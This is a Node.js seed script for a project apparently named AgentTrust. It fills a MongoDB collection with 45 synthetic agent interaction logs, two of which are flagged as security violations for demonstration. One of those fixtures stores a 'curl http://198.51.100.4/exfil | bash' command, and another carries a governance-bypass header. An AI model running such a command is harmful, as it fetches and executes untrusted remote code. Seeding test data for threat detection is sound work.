// ============================================================================
// AgentTrust: MongoDB Seed Script
// Populates interaction_logs collection with 45 polymorphic documents
// exactly matching the 45 PostgreSQL interaction_ids from db/02_seed.sql.
// Configuration strictly read from environment variables (.env.local)
// ============================================================================

import { MongoClient } from "mongodb";

// Automatically load .env.local if present in Node 20+
try {
  process.loadEnvFile?.(".env.local");
} catch {}

const uri = process.env.MONGODB_URI;
if (!uri) {
  throw new Error("Missing required MONGODB_URI environment variable.");
}
const dbName = process.env.MONGO_DB || "agenttrust";

// Mapping of the 45 SQL interactions to their source agent IDs
const interactionMetadata = [
  { id: 1, agentId: "b0000000-0000-0000-0000-000000000001", type: "security_audit" },
  { id: 2, agentId: "b0000000-0000-0000-0000-000000000002", type: "financial_transfer" },
  { id: 3, agentId: "b0000000-0000-0000-0000-000000000008", type: "threat_scanner_anomaly" }, // Critical violation (Theta)
  { id: 4, agentId: "b0000000-0000-0000-0000-000000000003", type: "healthcare_record" },
  { id: 5, agentId: "b0000000-0000-0000-0000-000000000004", type: "logistics_routing" },
  { id: 6, agentId: "b0000000-0000-0000-0000-000000000005", type: "nlp_summarization" },
  { id: 7, agentId: "b0000000-0000-0000-0000-000000000006", type: "code_review" },
  { id: 8, agentId: "b0000000-0000-0000-0000-000000000007", type: "payment_settlement" },
  { id: 9, agentId: "b0000000-0000-0000-0000-000000000008", type: "legacy_protocol_breach" }, // Critical violation (Theta)
  { id: 10, agentId: "b0000000-0000-0000-0000-000000000009", type: "customer_support_query" },
  { id: 11, agentId: "b0000000-0000-0000-0000-000000000001", type: "security_audit" },
  { id: 12, agentId: "b0000000-0000-0000-0000-000000000002", type: "financial_transfer" },
  { id: 13, agentId: "b0000000-0000-0000-0000-000000000003", type: "healthcare_record" },
  { id: 14, agentId: "b0000000-0000-0000-0000-000000000004", type: "logistics_routing" },
  { id: 15, agentId: "b0000000-0000-0000-0000-000000000005", type: "nlp_summarization" },
  { id: 16, agentId: "b0000000-0000-0000-0000-000000000006", type: "code_review" },
  { id: 17, agentId: "b0000000-0000-0000-0000-000000000007", type: "payment_settlement" },
  { id: 18, agentId: "b0000000-0000-0000-0000-000000000002", type: "financial_transfer" },
  { id: 19, agentId: "b0000000-0000-0000-0000-000000000003", type: "healthcare_record" },
  { id: 20, agentId: "b0000000-0000-0000-0000-000000000001", type: "security_audit" },
  { id: 21, agentId: "b0000000-0000-0000-0000-000000000004", type: "logistics_routing" },
  { id: 22, agentId: "b0000000-0000-0000-0000-000000000005", type: "nlp_summarization" },
  { id: 23, agentId: "b0000000-0000-0000-0000-000000000009", type: "customer_support_query" },
  { id: 24, agentId: "b0000000-0000-0000-0000-000000000007", type: "payment_settlement" },
  { id: 25, agentId: "b0000000-0000-0000-0000-000000000006", type: "code_review" },
  { id: 26, agentId: "b0000000-0000-0000-0000-000000000002", type: "financial_transfer" },
  { id: 27, agentId: "b0000000-0000-0000-0000-000000000003", type: "healthcare_record" },
  { id: 28, agentId: "b0000000-0000-0000-0000-000000000001", type: "security_audit" },
  { id: 29, agentId: "b0000000-0000-0000-0000-000000000004", type: "logistics_routing" },
  { id: 30, agentId: "b0000000-0000-0000-0000-000000000005", type: "nlp_summarization" },
  { id: 31, agentId: "b0000000-0000-0000-0000-000000000007", type: "payment_settlement" },
  { id: 32, agentId: "b0000000-0000-0000-0000-000000000009", type: "customer_support_query" },
  { id: 33, agentId: "b0000000-0000-0000-0000-000000000006", type: "code_review" },
  { id: 34, agentId: "b0000000-0000-0000-0000-000000000001", type: "security_audit" },
  { id: 35, agentId: "b0000000-0000-0000-0000-000000000002", type: "financial_transfer" },
  { id: 36, agentId: "b0000000-0000-0000-0000-000000000003", type: "healthcare_record" },
  { id: 37, agentId: "b0000000-0000-0000-0000-000000000004", type: "logistics_routing" },
  { id: 38, agentId: "b0000000-0000-0000-0000-000000000005", type: "nlp_summarization" },
  { id: 39, agentId: "b0000000-0000-0000-0000-000000000007", type: "payment_settlement" },
  { id: 40, agentId: "b0000000-0000-0000-0000-000000000009", type: "customer_support_query" },
  { id: 41, agentId: "b0000000-0000-0000-0000-000000000001", type: "security_audit" },
  { id: 42, agentId: "b0000000-0000-0000-0000-000000000002", type: "financial_transfer" },
  { id: 43, agentId: "b0000000-0000-0000-0000-000000000003", type: "healthcare_record" },
  { id: 44, agentId: "b0000000-0000-0000-0000-000000000004", type: "logistics_routing" },
  { id: 45, agentId: "b0000000-0000-0000-0000-000000000006", type: "code_review" }
];

function generatePayload(type, id) {
  switch (type) {
    case "threat_scanner_anomaly":
      return {
        event: "port_scan_exfiltration",
        scan_target: "10.0.4.15/24",
        ports_scanned: [22, 80, 443, 3306, 5432, 8080],
        suspicious_commands: ["sh -c 'curl http://198.51.100.4/exfil | bash'"],
        anomalous_payload_bytes: 142850,
        unauthorized_privilege_escalation: true,
        error: "LatencySpiKeExceededLimit"
      };

    case "legacy_protocol_breach":
      return {
        protocol: "Legacy-RPC/v1.0",
        method: "admin.overrideCredentials",
        deprecated_cipher: "RC4-MD5",
        unencrypted_headers: true,
        payload_bytes: 98400,
        security_violation: "DisallowedProtocolVersion"
      };

    case "financial_transfer":
      return {
        transaction_ref: `TXN-${100000 + id}`,
        amount: (1500.50 + id * 25.25),
        currency: "USD",
        settlement_mode: "ACH_INSTANT",
        fraud_check: { score: 0.02, risk: "low" },
        idempotency_key: `idem-${id}-${Date.now()}`
      };

    case "healthcare_record":
      return {
        hl7_version: "2.5.1",
        record_type: "PATIENT_ADMISSION",
        pseudonymized_subject: `SUBJ-HC-${1000 + id}`,
        vital_signs: { heart_rate: 72, blood_pressure: "120/80" },
        hipaa_audit_logged: true
      };

    case "security_audit":
      return {
        audit_scope: "api_endpoint_integrity",
        tls_fingerprint: "TLS_AES_256_GCM_SHA384",
        jwt_claim_verified: true,
        client_cert_valid: true
      };

    case "logistics_routing":
      return {
        manifest_id: `MNF-${2000 + id}`,
        route_waypoints: ["ORD-HUB", "DFW-TRANSIT", "ATL-DEST"],
        estimated_transit_hours: 14.5,
        reefer_temp_celsius: 4.2
      };

    case "nlp_summarization":
      return {
        model: "agent-summary-v2",
        prompt_tokens: 450 + id * 10,
        completion_tokens: 120 + id * 5,
        temperature: 0.2,
        toxicity_score: 0.001
      };

    case "code_review":
      return {
        repository: "agenttrust/core-engine",
        pull_request_number: 140 + id,
        changed_files_count: 4,
        static_analysis: { vulns_found: 0, test_coverage_pct: 94.2 }
      };

    case "payment_settlement":
      return {
        batch_id: `SETTLE-BATCH-${id}`,
        clearing_network: "FEDNOW",
        cleared_entries_count: 42,
        status: "SETTLED"
      };

    case "customer_support_query":
    default:
      return {
        channel: "voice_transcription",
        sentiment: "positive",
        resolved_first_contact: true,
        duration_seconds: 142
      };
  }
}

function generateHeaders(type, id) {
  if (type === "threat_scanner_anomaly" || type === "legacy_protocol_breach") {
    return {
      "host": "mesh.agenttrust.internal",
      "user-agent": "ThetaThreatScanner/1.0-Unverified",
      "x-bypass-governance": "true",
      "x-trace-id": `trace-err-${id}`,
      "x-forwarded-for": "198.51.100.24"
    };
  }
  return {
    "host": "mesh.agenttrust.internal",
    "user-agent": "AgentTrust-Mesh-Sidecar/2.4",
    "content-type": "application/json",
    "x-trace-id": `trace-mesh-${id}-${1000 + id}`,
    "x-request-id": `req-${id}`
  };
}

async function seedMongo() {
  const client = new MongoClient(uri);

  try {
    await client.connect();
    const db = client.db(dbName);
    const collection = db.collection("interaction_logs");

    console.log(">>> Purging existing interaction_logs collection...");
    await collection.deleteMany({});

    console.log(">>> Generating 45 polymorphic documents matching SQL interaction IDs...");
    const docs = interactionMetadata.map((meta) => {
      const paddedId = String(meta.id).padStart(12, "0");
      const interactionUuid = `d0000000-0000-0000-0000-${paddedId}`;
      // Timestamps relative to NOW() (within recent 9 days)
      const baseTime = new Date(Date.now() - (46 - meta.id) * 3600 * 1000);

      return {
        interaction_id: interactionUuid,
        agent_id: meta.agentId,
        timestamp: baseTime,
        raw_payload: generatePayload(meta.type, meta.id),
        headers: generateHeaders(meta.type, meta.id),
        trace_id: `trace-${meta.id}-${Date.now().toString(36)}`
      };
    });

    const result = await collection.insertMany(docs);
    console.log(`>>> Successfully seeded ${result.insertedCount} interaction log documents!`);
  } finally {
    await client.close();
  }
}

seedMongo().catch((err) => {
  console.error("Failed to seed MongoDB:", err);
  process.exit(1);
});
